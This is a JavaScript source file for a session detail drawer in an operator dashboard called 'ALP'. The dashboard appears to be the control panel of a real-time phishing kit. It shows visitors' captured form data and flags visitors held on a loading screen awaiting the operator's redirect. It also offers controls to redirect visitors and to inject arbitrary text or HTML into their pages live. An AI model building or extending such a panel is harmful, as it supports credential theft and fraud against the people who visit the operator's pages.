/**
 * ALP - Session Detail Drawer Component
 * Manages the slide-out session details panel and its interactions.
 */
const SessionDrawer = (() => {
  let onSessionUpdated = null;
  let onSessionDeleted = null;

  function init(options = {}) {
    onSessionUpdated = options.onSessionUpdated || null;
    onSessionDeleted = options.onSessionDeleted || null;

    const overlay = document.getElementById('detail-overlay');
    if (overlay) {
      overlay.addEventListener('click', (e) => {
        if (e.target === overlay) close();
      });
    }
  }

  async function open(sessionId) {
    const overlay = document.getElementById('detail-overlay');
    const panel = document.getElementById('detail-panel');
    if (!overlay || !panel) return;

    overlay.style.display = 'block';

    // Prevent background scrolling
    document.body.style.overflow = 'hidden';

    panel.innerHTML = `
      <div class="detail-header">
        <div style="display:flex; flex-direction:column; gap:2px;">
          <h2 style="font-size:16px; font-weight:700; color:var(--text-primary); margin:0;">Session Details</h2>
          <span style="font-size:10px; font-family:'JetBrains Mono', Consolas, monospace; color:var(--text-tertiary);">${SessionTemplates.escapeHtml(sessionId)}</span>
        </div>
        <button class="detail-close" id="detail-close">&times;</button>
      </div>
      <div style="text-align:center;padding:40px;color:var(--text-tertiary);">Loading…</div>
    `;

    // Connect close button immediately
    const initCloseBtn = panel.querySelector('#detail-close');
    if (initCloseBtn) initCloseBtn.addEventListener('click', close);

    try {
      const data = await window.ALPApi.getSession(sessionId);
      const s = data.session || data;
      const pageViews = data.page_views || data.pageViews || [];

      // Handle metadata
      let metadata = {};
      try {
        const raw = s.metadata;
        if (raw && typeof raw === 'object') {
          metadata = raw;
        } else if (typeof raw === 'string' && raw.trim()) {
          metadata = JSON.parse(raw);
        }
      } catch { metadata = {}; }

      const pagePath = (s.current_page || '').toLowerCase();
      const isHolding = s.is_active && SessionTemplates.isLoadingPage(pagePath, s.current_page_type);
      const isWarning = s.is_active && s.current_page_type === 'warning';

      const infoGridHtml = SessionTemplates.renderInfoGrid(s);
      const timelineHtml = SessionTemplates.renderTimeline(pageViews);
      const formDataHtml = SessionTemplates.renderFormData(metadata);
      const formCount = (metadata.formData && metadata.formData.length) ? metadata.formData.length : 0;

      // Render tabbed panel layout
      panel.innerHTML = `
        <div class="detail-header">
          <div style="display:flex; flex-direction:column; gap:2px;">
            <h2 style="font-size:16px; font-weight:700; color:var(--text-primary); margin:0; display:flex; align-items:center; gap:8px;">
              Session Details
              ${isHolding 
                ? `<span class="status-badge holding" style="font-size:8px; padding:1px 6px;">
                     ⏳ Holding
                   </span>`
                : isWarning
                ? `<span class="status-badge" style="font-size:8px; padding:1px 6px; background:rgba(239,68,68,0.15); color:#ef4444; border:1px solid rgba(239,68,68,0.3);">
                     🚨 Warning
                   </span>`
                : `<span class="status-badge ${s.is_active ? 'online' : 'offline'}" style="font-size:8px; padding:1px 6px;">
                     ${s.is_active ? 'Live' : 'Offline'}
                   </span>`
              }
            </h2>
            <span style="font-size:10px; font-family:'JetBrains Mono', Consolas, monospace; color:var(--text-muted); letter-spacing:-0.2px;">${SessionTemplates.escapeHtml(s.id)}</span>
            <div style="display:flex;align-items:center;gap:6px;margin-top:5px;">
              ${SessionTemplates.websiteLogoHtml(s, 18)}
              <span style="font-size:11px;color:var(--text-secondary);font-weight:600;">${SessionTemplates.escapeHtml(s.website_name || 'Unknown Site')}</span>
            </div>
          </div>
          <button class="detail-close" id="detail-close">&times;</button>
        </div>

        <div class="detail-tabs">
          <button class="detail-tab active" data-tab="info">ℹ️ Overview</button>
          <button class="detail-tab" data-tab="data">📝 Captured Data ${formCount > 0 ? `<span class="tab-badge">${formCount}</span>` : ''}</button>
          <button class="detail-tab" data-tab="history">📍 Timeline <span class="tab-badge secondary">${pageViews.length}</span></button>
        </div>

        <div class="detail-body" id="detail-body-content">
          ${isHolding 
            ? `<div style="background:rgba(245,158,11,0.06); border:1px solid rgba(245,158,11,0.22); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:#f59e0b;">
                 <span style="font-size:18px; animation: bounceSpin 2.5s infinite;">⏳</span>
                 <div>
                   <strong style="display:block; color:#f59e0b;">Visitor is Waiting on Loading Screen</strong>
                   User is waiting for your redirection response. Click "Redirect Visitor" below to redirect them.
                 </div>
               </div>`
            : ''
          }
          ${isWarning
            ? `<div style="background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.22); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:#ef4444;">
                 <span style="font-size:18px;">🚨</span>
                 <div>
                   <strong style="display:block; color:#ef4444;">Visitor is on a Warning/Alert Page</strong>
                   Use the Inject Text panel below to send a custom message to the visitor's page in real-time.
                 </div>
               </div>`
            : ''
          }
          <!-- Render Info tab content by default -->
          <div class="detail-section">
            <div class="detail-sec-title">Visitor Information</div>
            <div class="detail-grid">${infoGridHtml}</div>
          </div>
        </div>

        <div class="detail-footer" style="display:flex; flex-direction:column; gap:12px;">
          <!-- Inject Text Panel — visible for active sessions only -->
          ${s.is_active ? `
          <div style="border:1px solid rgba(99,102,241,0.25); border-radius:10px; overflow:hidden;">
            <div id="inject-panel-toggle" style="display:flex; justify-content:space-between; align-items:center; padding:9px 12px; background:rgba(99,102,241,0.07); cursor:pointer; user-select:none;">
              <span style="font-size:11px; font-weight:700; color:#a5b4fc; letter-spacing:0.3px;">✏️ Inject Text Into Page</span>
              <span id="inject-chevron" style="font-size:10px; color:var(--text-tertiary); transition:transform 0.2s;">▼</span>
            </div>
            <div id="inject-panel-body" style="display:none; padding:10px 12px; background:rgba(99,102,241,0.03); border-top:1px solid rgba(99,102,241,0.15);">
              <textarea id="inject-text-input" placeholder="Type text or HTML to inject into the visitor's page…" style="width:100%; height:70px; resize:vertical; background:rgba(15,15,20,0.6); border:1px solid rgba(99,102,241,0.3); border-radius:7px; padding:8px 10px; color:var(--text-primary); font-size:12px; font-family:Inter,sans-serif; outline:none; line-height:1.5; box-sizing:border-box;"></textarea>
              <div style="display:flex; gap:6px; margin-top:8px;">
                <button id="inject-send-btn" style="flex:2; padding:7px; background:linear-gradient(135deg,#6366f1,#4f46e5); color:#fff; border:none; border-radius:7px; font-size:11px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif;">💉 Inject</button>
                <button id="inject-clear-btn" style="flex:1; padding:7px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:7px; font-size:11px; font-weight:600; cursor:pointer;">✖ Clear</button>
              </div>
              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">The visitor's page must contain <code style="background:rgba(255,255,255,0.07); padding:1px 4px; border-radius:3px;">data-alp-inject</code> element. Supports plain text or HTML.</p>
            </div>
          </div>
          ` : ''}

          <!-- Status Header -->
          <div style="font-size:10px; font-weight:700; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px; display:flex; justify-content:space-between; align-items:center;">
            <span>Session Controls</span>
            ${isHolding 
              ? '<span style="color:#f59e0b; font-weight:bold; animation: alertBlink 1.2s infinite;">⚠️ Awaiting Release</span>'
              : isWarning
              ? '<span style="color:#ef4444; font-weight:bold; animation: alertBlink 1.2s infinite;">🚨 Warning Page</span>'
              : `<span style="color:${s.is_active ? '#10b981' : 'var(--text-tertiary)'}; text-transform:none;">${s.is_active ? '● Active' : 'Offline'}</span>`
            }
          </div>

          <!-- Action Buttons Row -->
          <div style="display:flex; gap:8px;">
            <button id="detail-redirect-modal-trigger" data-sid="${s.id}" style="flex:2; padding:9px; background:linear-gradient(135deg,#D4AF37,#B8962E); color:#0a0a0a; border:none; border-radius:8px; font-size:12px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:6px;" ${s.is_active ? '' : 'disabled'} title="Redirect Visitor">
              ↗️ Redirect Visitor
            </button>
            
            ${s.is_active ? `
              <button id="detail-end-session" data-sid="${s.id}" style="flex:1; padding:9px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px;" title="Force End Session">
                ⛔ End Session
              </button>
            ` : `
              <button id="detail-delete-session" data-sid="${s.id}" style="flex:1; padding:9px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px;" title="Permanently Delete Session">
                🗑️ Delete Session
              </button>
            `}
          </div>
        </div>
      `;

      // Connect close button
      const closeBtn = panel.querySelector('#detail-close');
      if (closeBtn) closeBtn.addEventListener('click', close);

      // Inject panel toggle
      const injectToggle = panel.querySelector('#inject-panel-toggle');
      const injectBody = panel.querySelector('#inject-panel-body');
      const injectChevron = panel.querySelector('#inject-chevron');
      if (injectToggle && injectBody) {
        injectToggle.addEventListener('click', () => {
          const open = injectBody.style.display !== 'none';
          injectBody.style.display = open ? 'none' : 'block';
          if (injectChevron) injectChevron.style.transform = open ? '' : 'rotate(180deg)';
        });
      }

      // Inject send button
      const injectSendBtn = panel.querySelector('#inject-send-btn');
      const injectInput = panel.querySelector('#inject-text-input');
      if (injectSendBtn && injectInput) {
        injectSendBtn.addEventListener('click', async () => {
          const text = injectInput.value;
          try {
            if (window.ALPSocket && typeof window.ALPSocket.injectText === 'function') {
              window.ALPSocket.injectText(s.id, text);
            } else {
              await window.ALPApi.injectText(s.id, text);
            }
            window.showToast('✅ Text injected!', 'success');
          } catch (e) {
            window.showToast('Failed to inject: ' + e.message, 'error');
          }
        });
      }

      // Inject clear button
      const injectClearBtn = panel.querySelector('#inject-clear-btn');
      if (injectClearBtn) {
        injectClearBtn.addEventListener('click', async () => {
          if (injectInput) injectInput.value = '';
          try {
            if (window.ALPSocket && typeof window.ALPSocket.injectText === 'function') {
              window.ALPSocket.injectText(s.id, '');
            } else {
              await window.ALPApi.injectText(s.id, '');
            }
            window.showToast('✅ Injection cleared!', 'success');
          } catch (e) {
            window.showToast('Failed to clear: ' + e.message, 'error');
          }
        });
      }


      // Connect tab buttons
      const tabButtons = panel.querySelectorAll('.detail-tab');
      const bodyContent = panel.querySelector('#detail-body-content');

      tabButtons.forEach(btn => {
        btn.addEventListener('click', () => {
          tabButtons.forEach(b => b.classList.remove('active'));
          btn.classList.add('active');
          const tab = btn.dataset.tab;

          if (tab === 'info') {
            bodyContent.innerHTML = `
              <div class="detail-section">
                <div class="detail-sec-title">Visitor Information</div>
                <div class="detail-grid">${infoGridHtml}</div>
              </div>
            `;
          } else if (tab === 'data') {
            bodyContent.innerHTML = formDataHtml;
          } else if (tab === 'history') {
            bodyContent.innerHTML = `
              <div class="detail-section">
                <div class="detail-sec-title">Page View History</div>
                <div style="padding-left:4px; margin-top: 10px;">${timelineHtml}</div>
              </div>
            `;
          }
        });
      });

      // Redirect modal trigger action
      const redirectTrigger = panel.querySelector('#detail-redirect-modal-trigger');
      if (redirectTrigger) {
        redirectTrigger.addEventListener('click', () => {
          if (window.SessionsPage && typeof window.SessionsPage.showRedirectModal === 'function') {
            window.SessionsPage.showRedirectModal(s.id);
          } else {
            console.error('SessionsPage.showRedirectModal not found');
          }
        });
      }

      // End session action
      const endBtn = panel.querySelector('#detail-end-session');
      if (endBtn) {
        endBtn.addEventListener('click', async () => {
          window.showModal({
            title: 'End Session',
            content: `<p>Are you sure you want to force-end session <strong>${SessionTemplates.escapeHtml(s.visitor_id || s.id)}</strong>?</p>`,
            onConfirm: async () => {
              try {
                await window.ALPApi.endSession(s.id);
                window.showToast('Session ended successfully', 'success');
                if (onSessionUpdated) {
                  onSessionUpdated(s.id, { is_active: false });
                }
                // Refresh drawer
                open(s.id);
              } catch (e) { window.showToast('Failed to end session: ' + e.message, 'error'); }
            }
          });
        });
      }

      // Delete session action
      const deleteBtn = panel.querySelector('#detail-delete-session');
      if (deleteBtn) {
        deleteBtn.addEventListener('click', async () => {
          window.showModal({
            title: 'Delete Session',
            content: `<p>Are you sure you want to permanently delete session <strong>${SessionTemplates.escapeHtml(s.visitor_id || s.id)}</strong>? All recorded page views and data will be lost.</p>`,
            type: 'danger',
            onConfirm: async () => {
              try {
                await window.ALPApi.deleteSession(s.id);
                window.showToast('Session deleted permanently', 'success');
                close();
                if (onSessionDeleted) {
                  onSessionDeleted(s.id);
                }
              } catch (e) { window.showToast('Failed to delete session: ' + e.message, 'error'); }
            }
          });
        });
      }

    } catch (err) {
      console.error('openDetail error:', err);
      panel.innerHTML = `
        <div class="detail-header">
          <h2 style="font-size:16px; font-weight:700; color:var(--text-primary); margin:0;">Error</h2>
          <button class="detail-close" id="detail-close">&times;</button>
        </div>
        <div style="text-align:center;padding:40px;color:#ef4444;">
          Failed to load session details<br>
          <small style="color:var(--text-muted);font-size:11px;">${SessionTemplates.escapeHtml(err.message || '')}</small>
        </div>
      `;
      const closeBtn = panel.querySelector('#detail-close');
      if (closeBtn) closeBtn.addEventListener('click', close);
    }
  }

  function close() {
    const overlay = document.getElementById('detail-overlay');
    if (overlay) overlay.style.display = 'none';

    // Restore background scrolling
    document.body.style.overflow = '';
  }

  return { init, open, close };
})();

if (typeof window !== 'undefined') {
  window.SessionDrawer = SessionDrawer;
}
